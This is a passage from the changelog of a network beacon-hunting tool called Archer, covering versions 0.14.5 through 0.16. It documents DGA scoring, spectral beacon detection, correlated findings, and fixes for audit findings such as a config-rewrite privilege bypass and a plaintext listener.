  on beacon destinations" toggle plus two calibration knobs
  (entropy threshold, bigram threshold). Defaults `dga_enabled=true`,
  `dga_entropy_threshold=3.5`, `dga_bigram_threshold=-4.5`.
- **`dga_beacon` golden scenario.** Mirrors `http_beacon` with
  a DGA-shaped Host header; demonstrates the +15 score / severity
  bump and the appended Detail-line diagnostic tag.
- **Beacon score evolution history.** `Store.SetFindings` now
  writes one row to a new `beacon_history` table per Beaconing /
  HTTP Beaconing finding per UTC day, keyed by a canonical-string
  `BeaconHistoryKey` over `(Type, SrcIP, DstIP, DstPort, Hostname,
  URI)` joined by ASCII Unit Separator (deliberately not hashed
  so the table remains SQLite-CLI inspectable when history rows
  outlive their source finding). PRIMARY KEY enforces "first
  full pass of the UTC day wins" so a noon re-run against
  partial logs doesn't overwrite the morning's snapshot.
  Migration 0011 adds the table; retention is 30 days (const,
  not config) swept on the watch's first-tick-of-day branch.
- **`GET /api/findings/{id}/history`** returns the 30-day
  evolution rows for a Beaconing / HTTP Beaconing finding
  (composite score + four sub-axis scores per row). Returns
  `[]` for non-beacon types so SPA can call unconditionally.
- **Score evolution chart in the finding detail pane.** SVG
  sparkline showing composite Score plus the four sub-axes (ts,
  ds, hist, dur) over up to 30 days. Hidden for non-beacon
  finding types. Documented under DETECTION_METHODS §2.6.

### Detection changes

- Beaconing and HTTP Beaconing scores against DGA-shaped
  destination hostnames now exceed their pre-DGA values by up
  to 15 points, and severity may step up one level. The Host
  Risk Score roll-up is unchanged (it uses fixed per-detector-
  type weights, not per-finding scores). To preserve pre-v0.16
  scoring, set `dga_enabled=false` in Settings.

## [v0.15.1] — 2026-05-11

Seventeenth external review round, first post-v0.15.0. Five
findings: three real bugs in the correlation feature shipped in
v0.15.0 (one Critical, two Medium), one consistency test for the
spectral marker contract, one documentation note. The Critical
item (NEW-71) was an asymmetric-contract bug at the boundary
between the analyzer's emission IDs and the store's persistence
IDs — the same shape NEW-49 (listener-config / threat-model
boundary) and NEW-60 (role-gate / operation-scope boundary) hit
earlier in the arc. Caught by the receiving auditor; would have
hit the team-handoff readiness claim the first time anyone wrote
a script against `/api/findings`.

### Fixed

- **NEW-71 (Critical): Finding.Correlations carried pre-translation
  fresh IDs that didn't match post-SetFindings persisted IDs.**
  `correlate.go` populates each contributor's `Correlations` slice
  with the per-run `a.nextID++` IDs at emit time; `SetFindings`
  then rewrites each finding's `ID` via fingerprint match against
  the existing store but did NOT translate the `Correlations`
  slice contents through the same rewrite. Net result: a finding
  with persisted ID 47 carried `Correlations=[5, 8]` referencing
  fresh IDs that either didn't exist post-translation or collided
  with unrelated findings from prior runs that happened to land on
  the same low IDs. The SPA's click handler resolves the
  Correlated Activity row by `(type, src_ip, dst_ip)` triple
  rather than by ID, so the chip-pivot UX worked in spite of the
  bug — but API consumers, JSON exports, and forensic inspection
  saw integer references that pointed at nothing. Audit-trail
  integrity ("when an analyst sees a Correlated Activity finding
  they can find its contributors") was undercut. Fix:
  `SetFindings` now builds a fresh-ID → persisted-ID map during
  its existing rewrite loop and translates every new finding's
  `Correlations` slice through it. Preserved historical findings
  are NOT touched (their slices were translated by the SetFindings
  run that originally persisted them and remain in persisted-ID
  space). Defensive: fresh IDs that don't translate get dropped
  rather than carried as dangling references — shouldn't happen
  given correlate.go only annotates `a.findings` entries with
  IDs from `a.findings`, but the guard prevents a future
  refactor from silently introducing dangling references.
  Regression test `TestSetFindings_TranslatesCorrelationIDs`
  asserts the post-merge state has all references in
  persisted-ID space across a re-fingerprint cycle.
- **NEW-72: `Finding.Correlations` was in-memory only — chip
  disappeared on server restart.** Pre-v0.15.0 schema didn't
  include a `correlations` column; `saveFindings` didn't
  serialize the field; `loadFindings` didn't read it back. After
  every server restart every finding's `Correlations` was empty
  until the next analysis run repopulated it. Mildly confusing
  for analysts ("yesterday's findings had correlation chips,
  today after a restart they don't, then after the next watch
  tick they do again"). Schema migration 0010 adds the column;
  save/load now round-trip the slice as JSON, matching the
  existing pattern for `intervals` / `ts_data` / `notes`.
  Regression test `TestSetFindings_CorrelationsPersistAcrossReload`
  asserts a saved finding survives a Store reload with its
  Correlations intact.
- **NEW-73: Correlation phase keyed on `(SrcIP, DstIP)` only,
  ignoring `Sensor`.** For multi-sensor deployments with
  overlapping captures (two Quiver collectors watching the same
  backbone), findings from different sensors on the same
  `(src, dst)` pair got conflated into a single Correlated
  Activity row. Same shape NEW-6 closed for beacon pair keys.
  Single-sensor deployments unaffected (Sensor is constant);
  multi-sensor overlapping deployments now correctly track
  per-sensor observations. `correlate.go`'s pair key becomes
  `struct{ sensor, src, dst string }`; the emitted Correlated
  Activity row also gets the `Sensor` field populated.
  Regression test `TestCorrelate_PartitionsBySensor` asserts
  two sensors observing the same (src, dst) pair produce two
  distinct correlations.
- **NEW-74: No regression test guarded the "Spectral rescued:"
  marker contract.** Three sites depend on the literal string —
  `conn.go` + `http_analysis.go` (emitters) and
  `findings_filter.go` (consumer for the
  `spectral_only=true` query param). A future refactor renaming
  the marker on one side would silently break the calibration
  filter chip ("Spectral rescued only" stops returning rows).
  Same shape as NEW-30 `_esc` consistency, NEW-41 audit-vocabulary,
  NEW-61 raw-decoder discipline — locks the convention as a
  compile-time-enforced test. New `TestSpectralRescueMarker_Contract`
  fails loudly if any of the three sites stops using the literal.

### Documentation

- **NEW-75: Historical-correlation semantics documented.**
  `DETECTION_METHODS.md` §13a now spells out that a preserved-
  historical finding's `Correlations` slice reflects past
  co-firing rather than current — `correlate.go`'s annotation
  pass walks `a.findings` only, so a contributor preserved
  across re-analyses keeps the slice it had when it last
  co-fired. Analysts inspecting an old finding with a chip
  should treat the slice as "correlated at some point in this
  finding's history," not "currently correlated."

## [v0.15.0] — 2026-05-11

Two feature waves after the v0.14 audit arc, both from
MATURATION_PLAN section 13b on the operator's stated mission of
best-in-class beacon hunting. **Same-pair multi-detector correlation**
catches kill-chain progression — multiple detector types lighting up
on the same `(SrcIP, DstIP)` pair — that no single detector surfaces.
**Spectral beacon detection** adds a Lomb-Scargle frequency-domain
rescue to the Beaconing timing axis, catching bounded-jitter C2 that
the distribution-based statistical paths (Bowley/MAD/multimodal/
entropy) explicitly miss. Both ship with their boundary validation,
defensive guards, and config tunables.

### Added

- **Correlated Activity finding type** — emitted by a new Phase 3.5
  step (`internal/analysis/correlate.go`) when two or more distinct
  detector types fire on the same `(SrcIP, DstIP)` pair. Catches the
  kill-chain progression shape that any single detector misses:
  Beaconing + DNS Tunneling to the same destination, Suspicious File
  Download + TI Hit (Hash) on the same host pair, etc. Contributors
  get annotated with sibling finding IDs via a new
  `Finding.Correlations []int` field; the Findings table surfaces a
  `+N corr` chip on each contributor that pivots to the roll-up on
  click.
- **`correlation_min_types` config field** — minimum distinct
  detector types required to emit a correlation, default 2. Tunable
  via `PUT /api/config`; rejected at the API boundary when < 2
  (degenerate — would correlate every single-detector pair) and
  short-circuited defensively in `correlateFindings` (NEW-66
  defense-in-depth pattern).
- **`model.IsRollupType` helper** — distinguishes analyzer-derived
  roll-ups (Host Risk Score, Correlated Activity) from per-record
  detections. Used by `Store.SetFindings`'s preserve-historical loop
  to purge stale roll-up rows.
- **Spectral beacon detection** — Lomb-Scargle periodogram over the
  pair's reservoir-sampled timestamps, augmenting the Beaconing and
  HTTP Beaconing timing axes. Catches bounded-jitter C2 (fixed
  schedule with random offset per request) that statistical scoring
  explicitly misses — exactly the shape adversaries who care about
  evading timing-regularity detection produce. Implementation in
  `internal/analysis/spectral.go`. Rayleigh power form (no tau
  degeneracy, clean null-hypothesis interpretation), 2000-point
  log-spaced period grid from 5s to window/2. CPU cost ~4 ms per
  pair on the 200-timestamp reservoir; combined with the rescue
  gate (only fires when statistical scoring already failed) the
  per-run overhead is bounded.
- **Spectral config knobs** — `SpectralEnabled` (default true),
  `SpectralMinObservations` (default 16), `SpectralFAPThreshold`
  (default 12.0, ~exp(-12) per-frequency false alarm),
  `SpectralRescueThreshold` (default 0.5, gate above which spectral
  doesn't fire). All four tunable via `PUT /api/config` with
  boundary rejection of degenerate values; the analyzer also
  defends itself defensively (NEW-66 pattern).
- **Spectral calibration UI.** Spectral defaults are conservative
  but the FAP/rescue/min-obs band only earns its keep against real
  captures, so the calibration loop has to live in the SPA rather
  than in curl/jq. Four pieces: (1) on/off toggle in the Beaconing
  Settings group, (2) three threshold number inputs with tooltips
  explaining which direction tightens vs loosens, (3) "Spectral
  rescued only" checkbox in the advanced filter bar with a matching
  `spectral_only=true` server-side query param on `/api/findings`,
  (4) enriched Detail string on rescued findings showing score,
  dominant period, raw Lomb-Scargle power, and the active FAP
  threshold — enough for an analyst to judge "borderline (power
  12.1 vs threshold 12.0)" vs "unambiguous (power 37.2 vs threshold
  12.0)" from one row.

### Fixed

- **Stale Host Risk Score rows when every contributor is purged.**
  TODO #3 from v0.14.10 — the narrow case the NEW-67 union didn't
  cover. When an operator archives or deletes every contributing
  finding for a host, the HRS row was preserved as historical
  indefinitely with no defensible source. `SetFindings` now drops
  preserved historical findings of any roll-up type whose
  fingerprint isn't regenerated this run; the roll-up phase is
  authoritative, and absence-from-regeneration is authoritative
  too. Same fix applies to Correlated Activity from day one — built
  the fix for both together rather than introducing a known orphan
  shape alongside the new feature.

### Detection changes

- **New finding type: `Correlated Activity`.** Score = max(contributor
  scores) + 5 per distinct detector type above the minimum, capped
  at 99. Severity from standard score bands. Ineligible contributor
  types: `Host Risk Score`, `Correlated Activity` (recursion
  guards), `Zeek Notice` (too noisy), `Long Connection` (too weak in
  isolation). Three offline golden scenarios re-baselined where
  underlying logs genuinely had multiple detector types on the same
  (src, dst): `strobe` (Beaconing + Strobe), `ti_misp_feed`
  (Suspicious File Download + Suspicious URL), `ti_misp_hash`
  (Suspicious File Download + TI Hit (Hash)). No detection scores
  on existing types changed; the roll-up is purely additive
  alongside the underlying findings.
- **Host Risk Score detection list no longer includes roll-up
  types.** `aggregateRisk`'s contributor filter now skips both
  `Host Risk Score` (recursion guard, already excluded pre-fix) and
  `Correlated Activity` (new). The HRS Detail string previously
  listed Correlated Activity alongside the underlying detector
  types, which conflated the roll-up with its inputs; the per-host
  detection breakdown now reflects only the per-record detections
  that actually drove the score.
- **Beaconing timing axis adds a fourth augmentation (spectral).**
  `ts_score = max(raw_ts, multimodal, entropy, spectral)`. The
  rescue runs only when the existing three score below
  `SpectralRescueThreshold` (default 0.5) AND the pair has at
  least `SpectralMinObservations` (default 16) reservoir samples.
  Existing Beaconing findings on data the statistical chain
  already handled aren't affected (their timing score stays
  unchanged because spectral doesn't fire). New findings — beacons
  with bounded jitter that the statistical chain scored low — get
  a `Spectral rescued: score=… (dominant period …s, power …, FAP
  threshold …)` tag in the Detail string so analysts know which
  signal drove the score and at what confidence. Same wiring for
  HTTP Beaconing.

## [v0.14.10] — 2026-05-11

Sixteenth-round rotation audit, residual hygiene phase. Two
mechanical fixes from a deliberate read of the analyzer's host-risk
roll-up — both pre-existing latent issues surfaced by the audit
discipline rather than new regressions. A third audit item
(periodic session prune) was a false positive: `pruneSessionsLoop`
has been wired from `NewUserStore` since the user store was
written. Captured as a maturation note rather than re-implementing
what's already there.

### Detection changes

- **Host Risk Score now reflects the host's complete detection
  footprint, not just this run's (NEW-67).** Pre-fix
  `aggregateRisk` computed HRS from `a.findings` alone — the fresh
  per-run slice. A host whose contributing detections were
  preserved in the store from a prior run but went silent this
  run never got a fresh HRS row; combined with `SetFindings`'s
  preserve-historical loop, the OLD HRS row survived in the
  store indefinitely with whatever score it was last assigned.
  Operationally visible as: the Hosts tab shows a host at risk
  65, the analyst clicks through to find none of the
  contributing detections are currently re-firing, the scores
  on the two tabs don't match the visible evidence.

  The fix wires a `FindingsProvider` interface (mirroring
  `FeedProvider`) and has `aggregateRisk` union the preserved
  finding set with this-run's `a.findings` before composing
  per-host scores. The interface accepts nil so tests and the
  archive-scan path (which intentionally scopes to one log
  bundle, no historical context) keep their current shape.
  Existing `Host Risk Score` rows are explicitly filtered from
  the contributor union — they're the roll-up, not a detector,
  and folding them in would double-count and spiral upward
  across runs. The store still preserves prior HRS rows by
  fingerprint, so re-emitting overwrites in place and the row's
  ID is preserved across runs. Audit 2026-05-11 NEW-67.

  Stale-HRS-when-detections-are-actually-gone (operator
  explicitly archived/deleted all contributing rows for a host)
  is a separate case that this fix does not address — the
  aggregator has nothing to compute from in that case, so the
  old HRS persists. That's the right shape for "archive doesn't
  rewrite history" semantics; if a deployment ever needs to
  bulk-purge HRS, that's an admin tool, not analyzer logic.

- **`aggregateRisk` iterates hosts in sorted order (NEW-68).**
  Pre-fix `for src, hd := range hosts` used Go's randomized map
  iteration; `a.add` assigns finding IDs in call order, so two
  fresh runs on identical input (post-ClearFindings) produced
  different HRS IDs for the same host. Doesn't matter in steady
  state — `SetFindings` carries IDs forward by fingerprint — but
  was a real concern for golden-test reproducibility and for any
  analyst workflow that compares notes by ID across fresh
  baselines. Sorting the host keys before iteration is the same
  pattern `risk.go`'s `typeList` already used at the inner
  level. Audit 2026-05-11 NEW-68.

### Added

- **Regression tests for the two `aggregateRisk` fixes.**
  `TestAggregateRisk_UnionsHistoricalFindings` codifies NEW-67
  by feeding a stub historical set and asserting the quiet host
  gets a fresh HRS row with the correct composite, while
  preventing the stale-HRS-feeds-back-in double-count failure
  mode. `TestAggregateRisk_DeterministicHostOrder` runs five
  trials and asserts the HRS rows emerge in sorted SrcIP order
  every time, codifying NEW-68.

### Maturation lessons

- **The rotation discipline produces both real fixes and false
  positives — and that's healthy.** NEW-69 (periodic session
  prune) was flagged as a missing feature; the implementation
  has been there since the user store was written
  (`pruneSessionsLoop` wired from `NewUserStore`). The auditor
  reasoning was sound — they were checking for a "session
  cleanup" pattern by grep'ing `start*PruneLoop` in
  `server.go`, which is where the other prune loops live. The
  user-store loop is hidden in the store constructor instead.
  Not a bug, but the inconsistency is the kind of thing that
  causes future audits to keep re-discovering "missing"
  features. Worth a future cosmetic pass to surface
  `startSessionPruneLoop` from `server.go` for symmetry — but
  not at the cost of inventing a parallel loop just to satisfy
  the convention. Discoverability for the next reader matters
  more than perfect grep-locality.

- **Roll-up findings must be type-filtered out of their own
  inputs.** NEW-67's union introduces the hazard that the
  contributor set would include the previous run's HRS rows,
  which would feed back into the new composite and spiral
  scores upward across runs. The filter is one line — but the
  hazard is exactly the kind of recursive-feedback bug that's
  invisible in casual review and would surface as "the Hosts
  tab risk scores keep climbing" after a few runs. Pattern to
  watch for: any future aggregator that reads from the merged
  finding set should explicitly exclude its own output type.

## [v0.14.9] — 2026-05-11

Residual-risk-and-hygiene pass after fifteen rounds. Three items
from the post-v0.14.8 audit: HTTP server timeouts (slowloris /
half-open idle-socket exposure), analyze-lifecycle audit emissions
(the last unattributed surface), and a defensive analyzer-side
guard against the silent off-hours-disable failure mode.

### Security

- **HTTPS listener now sets explicit ReadHeader/Read/Idle
  timeouts (NEW-64).** Pre-fix Archer's listener was the bare
  `http.ListenAndServeTLS` convenience wrapper, which builds an
  `http.Server` with zero timeouts on every field. Practical
  exposure is modest (the listener is rarely internet-facing for
  the small-team deployments Archer targets), but slowloris-style
  header drips, half-open idle sockets, and stalled bodies could
  each hold a goroutine open indefinitely — exactly the shape of
  bug that surfaces under load or under deliberate exhaustion.
  `ReadHeaderTimeout: 10s` short-circuits header-stage starvation,
  `ReadTimeout: 30s` bounds total body read (Archer's largest
  legitimate body is the ~16 KB config JSON), `IdleTimeout: 120s`
  closes quiet keep-alive sockets. `WriteTimeout` deliberately
  stays at zero because `/events` is the long-lived SSE stream
  for the analyst's whole session and progress events on long
  analyses can space minutes apart — a non-zero WriteTimeout
  would silently terminate those connections. Audit 2026-05-11
  NEW-64.

### Added

- **Analyze-lifecycle endpoints emit audit rows (NEW-65).**
  `POST /api/analyze`, `/api/analyze/cancel`, `/api/analyze/pause`,
  `/api/analyze/resume`, and `/api/analyze/reset` now record
  `analyze_start` / `analyze_cancel` / `analyze_pause` /
  `analyze_resume` / `analyze_reset` actions. Pre-fix the only
  forensic trace of an analyst kicking off, pausing, or
  cancelling a run was the SSE status broadcast and the
  analyzer's own log lines — both ephemeral. Now "who ran what
  pipeline when" sits next to `config_change` in the audit
  table. Watch-driven runs pass through `launchAnalysis`
  directly without traversing these handlers, so they remain
  unattributed by design — that's the intended split between
  "operator action" and "scheduler tick." Audit 2026-05-11
  NEW-65.

### Detection changes

- **Off-hours detection short-circuits on an invalid window
  (NEW-66).** `PUT /api/config` rejects `OffHoursStart ==
  OffHoursEnd` (and out-of-range hours) at the API boundary
  because the equality case silently disables off-hours
  detection — the `>Start` branch is false because the bounds
  are equal, and the `>=Start && <End` branch can never hold
  when Start == End. The API gate is the primary defense, but
  the underlying settings row can be planted via direct DB
  write, a future config-loading bug, or a half-applied
  migration. The analyzer now hoists the validity test out of
  the per-record hot path and skips off-hours scoring entirely
  when the window is invalid. Failure mode shifts from "silently
  produce wrong findings" to "off-hours produced no findings" —
  the right shape for a security detector. Existing valid
  windows are unaffected. Audit 2026-05-11 NEW-66.

### Maturation lessons

- **Audit-log emission is a route-level invariant, not a
  per-feature decision.** NEW-65 closed the last unattributed
  state-changing surface on the analyze pipeline; the rotation
  discipline from v0.14.8 should add to its checklist:
  **"does every state-mutating route on this handler emit an
  audit row on the success path?"** Not "is there an audit row
  somewhere in this file?" — every state-mutating endpoint.
  The analyze handlers had this gap since the analyze surface
  was first written; thirteen audit rounds checked other things
  first.

- **API-boundary validation is necessary but not sufficient
  for security-relevant config.** NEW-66 is the second instance
  this pass of "the boundary check catches the normal path,
  but the consumer should fail gracefully when the value still
  ends up invalid." For a security detector, "silently disabled"
  is worse than "loudly broken" — the analyzer doing its own
  shape check is cheap, the detector failure mode it prevents
  is severe. Worth a sweep for other config fields where a
  rogue value could silently disable a detection rather than
  surface an error.

## [v0.14.8] — 2026-05-11

Hotfix on top of v0.14.7. One Critical from the long-standing-
code rotation audit the v0.14.7 maturation note committed to,
plus the v0.14.7-promised decoder-discipline cleanup and two
small hygiene items.

### Security

- **POST `/api/analyze` no longer accepts a config-rewrite body
  (NEW-60).** Pre-fix the analyze handler was registered behind
  the `write` middleware (analyst+) but its body accepted a
  `{"config": {...}}` payload and silently rewrote the
  analyzer config via `json.Unmarshal` + `store.SetConfig` —
  bypassing the admin gate, range validation (off-hours
  equality, port bounds), AND the `config_change` audit row
  that `PUT /api/config` enforces. A compromised analyst
  session could:
   - Disable beacon detection (`beacon_min_connections:
     1000000`).
   - Silently disable off-hours detection — the very condition
     `PUT /api/config` validates against because the silent-
     disable mode was a real bug discovered earlier and the
     validation gate exists specifically for it.
   - Rotate operator API keys (OTX, AbuseIPDB, VirusTotal,
     Censys) to attacker-controlled values, redirecting
     threat-intel lookups to attacker infrastructure.
   - Shift the operator timezone, displacing the off-hours
     window from the operator's actual off-hours.
  None of this audited. The `config_change` row was
  bypassed because the mutation went through a different
  handler.

  Asymmetric-validation: same shape as NEW-15 (sensor name
  validated at enroll, not checkin) and NEW-37 (status
  validated at import, not PATCH). The same operation had two
  entry points; one validated and audited, one didn't.

  Fix removes the config-rewrite path from the analyze handler
  entirely. The handler reverts to a pure trigger-an-analysis
  shape with no body. Config changes go through PUT
  `/api/config` (admin-only, validated, audited). The SPA
  never sent a config body to analyze, so the UI is
  unaffected. Audit 2026-05-11 NEW-60.

  This was a thirteenth-round miss. The audit lesson recorded
  in v0.14.7's CHANGELOG ("long-standing-code rotation: read
  unchanged modules quarterly") realized in the very next
  release. NEW-31 (atomic analysis claim) had this handler
  open and noted the route gate, but didn't read the
  config-mutation path — checking that the surface was
  correct, not that the surface matched the operation behind
  it. Same shape as NEW-49 at one layer of abstraction up.

### Changed

- **Six more raw `json.NewDecoder(r.Body).Decode(...)` chains
  migrated to `decodeJSONBody` (NEW-61).** NEW-35 / NEW-40 /
  NEW-50 / NEW-58 collectively established the discipline
  ("every request-body decode is size-capped, returns 413 on
  cap-trip, never echoes raw decoder error text"). Six
  endpoints had escaped the migration: `handleNotifications`,
  `handleWatch`, `handleArchive`, `handleArchiveRun`,
  `handleImportJSON`, and two sites in `handleFeeds`. None
  were known-vulnerable in isolation (most admin-only,
  narrower risk profile than the analyst-facing endpoints
  the previous waves covered) but the discipline needs to be
  uniform across all handlers — a gap is exactly the surface
  area a future regression slips into. All seven sites now
  go through `decodeJSONBody`. `handleImportJSON` specifically
  was the last site reflecting raw `err.Error()` text back to
  the caller (decoder offsets, character positions) — the
  exact echo-decoder-internals shape NEW-40 was meant to
  eliminate for the admin endpoints. Audit 2026-05-11 NEW-61.

- **`handleNotifications` rejects unrecognized actions and
  unsupported methods (NEW-63).** Pre-fix an unknown
  `req.Action` value silently returned 200 OK with no
  effect, and verbs other than GET/POST got an empty
  response that net/http defaulted to 200 OK — confusing
  API surface where clients couldn't tell their request did
  nothing. Now both fall through to clear 400 / 405
  responses. Audit 2026-05-11 NEW-63.

### Removed

- **Vestigial `Access-Control-Allow-Origin: *` header on the
  SSE endpoint (NEW-62).** The SPA is same-origin, CORS
  isn't needed; Archer doesn't set
  `Access-Control-Allow-Credentials`, so cross-origin
  EventSource attempts couldn't carry the session cookie
  regardless — the header was confusing review noise from
  an early experiment. Removed entirely. Audit 2026-05-11
  NEW-62.

### Added

- **`TestNoRawJSONDecoderOnRequestBody` regression test
  (NEW-61).** Walks every `.go` file in the server package
  and asserts no handler contains
  `json.NewDecoder(r.Body)` without a surrounding
  `MaxBytesReader` call. Same shape as NEW-30's `_esc`
  consistency test and NEW-41's action-vocabulary
  consistency test: the rule is the test, not a docstring
  that drifts as new handlers are added. A future
  contributor adding a new endpoint with an ad-hoc raw
  decoder fails CI rather than fragmenting the discipline.

### Maturation lessons

- **The rotation discipline works, and it surfaces the
  highest-impact misses.** v0.14.7's CHANGELOG committed to
  "rotating audit attention through unchanged code on a
  schedule" specifically because NEW-46 and NEW-49 were
  pre-existing bugs that survived ten+ rounds. NEW-60 is the
  same shape: it's been in the codebase since the analyze
  handler was first written and survived thirteen prior
  audit rounds because the auditor was checking new code each
  time. The rotation found it in the very next release. The
  practical question to add to each rotation pass:
  **"does the role gate on this route match the operations
  the handler performs?"** Not "is there a role gate?" —
  whether the gate's permissions are correctly scoped for
  what the handler can do. Recorded in MATURATION_PLAN
  alongside the existing rotation discipline.

## [v0.14.7] — 2026-05-11

Hygiene and operational-discoverability release closing the
remaining items from the thirteenth audit pass. Four items;
none gate team handoff, but two (NEW-56 cookie symmetry +
NEW-58 Quiver decoder migration) were called out as "fix these
and the codebase is at v1.0 quality" — closing them puts the
project there even with the 0.x prefix.

### Changed

- **Logout `Set-Cookie` carries the same security flags as
  login (NEW-56).** Pre-fix the clearing cookie was emitted as
  `{Name, Value:"", Path:"/", MaxAge:-1}` — deletion worked
  because RFC 6265 §5.3 matches the existing cookie on
  `(name, path, domain)` only, but the drift between the
  set-cookie sites (Secure + HttpOnly + SameSite=Strict) and
  the clear-cookie site (none of those) was exactly the
  "aspirational convention" failure mode NEW-30 was about.
  Now every `Set-Cookie` for `sessionCookie` carries the same
  security attributes. Defense-in-depth + symmetry: a future
  edit that re-introduces an HTTP listener can't accidentally
  expose the clear-cookie path. Audit 2026-05-11 NEW-56.

- **Sensor `quiver.sh` validates `/etc/quiver/secret` shape
  before signing (NEW-57).** Pre-fix `-s` checked only that
  the file was non-empty; if the file got corrupted (partial
  disk write during reboot, FS error, accidental operator
  edit), `CHECKIN_SECRET` got whatever bytes were there,
  openssl HMACed with the wrong key, and the server recorded
  `sensor_unauthorized_attempt` with `reason=bad_hmac` every
  hour while the sensor appeared healthy locally. Sensor-side
  diagnosis required reading the server audit log first; the
  operator couldn't tell from the sensor alone. Added
  charset + length sanity check at script start: expected 43
  characters, charset `[A-Za-z0-9_-]` (URL-safe base64
  RawURLEncoding of 32 random bytes). Mismatch produces a
  loud `quiver: ${SECRET_FILE} ... corrupted ... re-run the
  install one-liner` message to stderr (which lands in
  cron's mail / syslog depending on distro). The `unknown`
  status branch in the response handler now also routes the
  operator to the audit log's `details.reason` field so they
  can distinguish unknown-name from bad-HMAC. OPERATIONS.md
  Disaster-recovery symptom→first-step table extended with
  both failure modes. Audit 2026-05-11 NEW-57.

- **Quiver enroll + checkin endpoints decode with the
  v0.14.3 helper / pattern (NEW-58).** `/api/quiver/enroll`
  migrated to `decodeJSONBody` for the same 413-on-cap-trip
  semantics the admin endpoints already have. The checkin
  endpoint can't use the helper directly (the raw body
  bytes are needed for HMAC verification before decode, so
  read+cap+decode is a two-step) but the read step now
  returns 413 on cap-trip via the same `errors.As(err,
  *MaxBytesError)` pattern instead of 400+`"could not read
  body"`. Operationally indistinguishable from a
  JSON-shape problem otherwise — fixed for the admin paths
  in NEW-40, fixed for the sensor paths here. Audit
  2026-05-11 NEW-58.

### Documentation

- **OPERATIONS.md → Sensor lifecycle now explicitly
  documents the `-k --pinnedpubkey` Curl idiom (NEW-59).**
  Security reviewers scanning the install script and
  `quiver.sh` flag `-k` as alarming; the combination is
  the documented Curl idiom for pin-only verification and
  is correct. Doc note explains the layering (`-k`
  removes the chain check, `--pinnedpubkey` provides the
  integrity check; Curl applies both, not OR), and the
  intentional invariant: don't remove `-k` "because we
  have a CA cert now" — that couples sensor behaviour to
  deployment posture in a way that breaks the
  swap-your-cert-in-place promise. Audit 2026-05-11
  NEW-59.

### Maturation lessons

- **Long-standing-code rotation audit.** Per the auditor's
  trajectory note: once per quarter, deliberately read one
  module that wasn't touched in the latest release. Not
  "is there a new bug" but "if I had never seen this
  before, would the code make me trust it?" NEW-46 (login
  timing oracle) and NEW-49 (plaintext listener) were both
  pre-existing bugs that survived because audit attention
  was on what changed. Rotating attention through
  unchanged code on a schedule prevents that pattern from
  repeating. Recorded in MATURATION_PLAN. Candidate
  modules for the rotation: the analyzer math, the parser,
  the SSE broker, the watch loop, `cmd/archer/main.go` +
  deployment artifacts, the auth layer.

## [v0.14.6] — 2026-05-11

Hotfix on top of v0.14.5. The HTTPS-only deployment from v0.14.5
shipped with the pre-existing Ed25519 self-signed cert, which
browsers (Chrome, Safari, Firefox) refuse as a server cert —
`ERR_SSL_VERSION_OR_CIPHER_MISMATCH` on every browser load.
Sensors using `curl --pinnedpubkey` were fine because curl
supports Ed25519, but admins / analysts / viewers couldn't reach
the UI at all. NEW-55.

### Changed

- **Auto-gen TLS cert uses ECDSA P-256, not Ed25519 (NEW-55).**
  Universally supported by every modern browser and TLS library
  while still working with curl's `--pinnedpubkey` path that
  sensors use — pinning is over SubjectPublicKeyInfo, not key
  algorithm, so sensors don't care which algorithm produced the
  public key. The original Ed25519 choice predates v0.14.5's
  unification of the listeners; pre-v0.14.5 the cert was only
  ever consumed by sensor curls, where Ed25519 worked. NEW-49's
  redirect of browsers to the same cert exposed the limitation.

- **Existing Ed25519 auto-gen certs are transparently upgraded
  on next startup.** Detects the pre-v0.14.6 shape (Ed25519
  public key + Subject CN="archer" + self-signed) and
  regenerates with ECDSA P-256. Operator-supplied certs in any
  algorithm (RSA, ECDSA, even Ed25519 — if the operator chose
  it deliberately for a curl-only deployment with a non-"archer"
  Subject) are honoured as-is. The auto-upgrade narrows on the
  specific fingerprint of our auto-gen output so an operator-
  supplied Ed25519 cert isn't accidentally replaced.

  Regression tests in `tls_test.go`:
   - `TestEnsureTLS_AutoGenIsECDSA`: new auto-gen output is
     ECDSA P-256.
   - `TestEnsureTLS_AutoUpgradesEd25519AutoGen`: pre-v0.14.6
     auto-gen Ed25519 cert is replaced with ECDSA on next
     startup.
   - `TestEnsureTLS_PreservesOperatorEd25519`: an Ed25519 cert
     with an operator-shaped Subject is NOT auto-replaced
     (auto-upgrade is targeted, not aggressive).

  **Sensor impact**: enrolled sensors will see a fingerprint
  change on the next checkin if they were pinned against the
  Ed25519 auto-gen cert. The fingerprint change is the same
  shape as any cert rotation — sensors need to be re-enrolled
  (re-run the install one-liner from the Sensors modal).
  Pre-NEW-49 deployments where the Ed25519 cert was the
  *original* cert never enrolled real sensors against it
  (admins also couldn't reach the UI via browser), so this
  affects only a narrow window of pre-v0.14.6 production
  deployments. The cert-continuity guidance in OPERATIONS.md
  applies: back up `/data/tls/` before any cert rotation
  (auto-upgrade or operator-initiated), and operators who
  wanted to avoid the re-enroll burden should have already
  swapped in a CA-signed cert per OPERATIONS.md's recommended
  pre-production hardening step.

## [v0.14.5] — 2026-05-11

Tenth audit-driven correctness release. **Breaking deployment
change**: the plaintext `:8080` listener has been removed (NEW-49).
Archer is HTTPS-only as of v0.14.5; every role (admin, analyst,
viewer, sensor) authenticates and operates over TLS. Plus five
smaller items from the same review pass (NEW-50 through NEW-54).

### Breaking

- **The plaintext `:8080` listener is removed (NEW-49).** Pre-fix
  Archer ran a plain HTTP listener on `:8080` for the analyst UI
  and a TLS listener on `:8443` for sensor traffic; the operator
  documentation and code both described `:8080` as "the analyst
  UI" and every user role (admin / analyst / viewer) logged in
  over cleartext. Passwords, session cookies, audit-log reads,
  finding pivots, analyst notes, feed API keys, IOC/allowlist
  contents — all in plaintext on the wire over the LAN that
  Archer is deployed to *monitor for adversaries*. For a tool
  whose threat model is "the LAN may be hostile" this is
  load-bearing flaw. Same broadcast domain, ARP spoofer,
  compromised IoT device on the admin LAN, or even a switch in
  monitor mode all captured the entire admin session in clear.
  No mature security team would accept this; we shouldn't have
  shipped with it.

  Fix collapses to a single TLS listener. The `--addr` flag is
  removed entirely; `--tls-addr` (default `:8443`) is the only
  listener configuration knob. TLS-bootstrap failure is now
  fatal (`log.Fatal`) rather than logged-and-continued —
  there's no fallback because there's no plaintext fallback to
  fall back to. The session cookie gets `Secure: true`
  unconditionally so the browser will never downgrade it to a
  plaintext channel that no longer exists.

  Concurrency / cert implications:
   - The unified listener has no concurrency concerns. Sensor
     heartbeat traffic is statistical noise (~0.014 req/sec per
     50-sensor fleet) compared to analyst SPA load; Go's
